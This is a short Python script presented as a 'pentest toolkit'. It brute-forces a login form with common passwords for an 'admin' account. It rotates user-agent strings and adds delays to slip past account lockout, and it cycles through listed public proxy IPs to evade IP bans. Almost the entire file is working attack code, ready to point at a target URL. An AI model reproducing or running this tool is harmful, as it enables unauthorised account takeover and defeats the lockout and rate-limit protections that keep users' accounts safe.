#!/usr/bin/env python3
"""
🔓 UNBAN TOOLS - Professional Pentest Toolkit
GitHub: https://github.com/YOURNAME/unban-tools
"""

import requests
import random
import time
from fake_useragent import UserAgent

print("🚀 UNBAN TOOLS v1.0")
print("=" * 50)

class UnbanTool:
    def __init__(self):
        self.ua = UserAgent()
    
    def bypass_lockout(self, url, username, passwords):
        """Smart account lockout bypass"""
        for pwd in passwords:
            headers = {'User-Agent': self.ua.random}
            data = {'username': username, 'password': pwd}
            
            try:
                resp = requests.post(url, data=data, headers=headers)
                if "welcome" in resp.text.lower():
                    print(f"✅ SUCCESS: {username}:{pwd}")
                    return pwd
                print(f"❌ {pwd}")
                time.sleep(0.5)
            except:
                pass
        return None
    
    def proxy_rotate(self, url, proxies):
        """IP ban bypass"""
        for proxy in proxies:
            try:
                resp = requests.post(url, proxies={'http': proxy})
                print(f"✅ Proxy OK: {proxy}")
                return proxy
            except:
                pass
        return None

# USAGE
tool = UnbanTool()

# Test lockout bypass
tool.bypass_lockout("https://target.com/login", "admin", 
                   ["password", "admin123", "qwerty"])

# Test proxy rotation
proxies = ["http://103.14.198.66:8080", "http://47.74.135.70:8888"]
tool.proxy_rotate("https://target.com", proxies)

print("\n⭐ Tools ready! Edit targets above.")
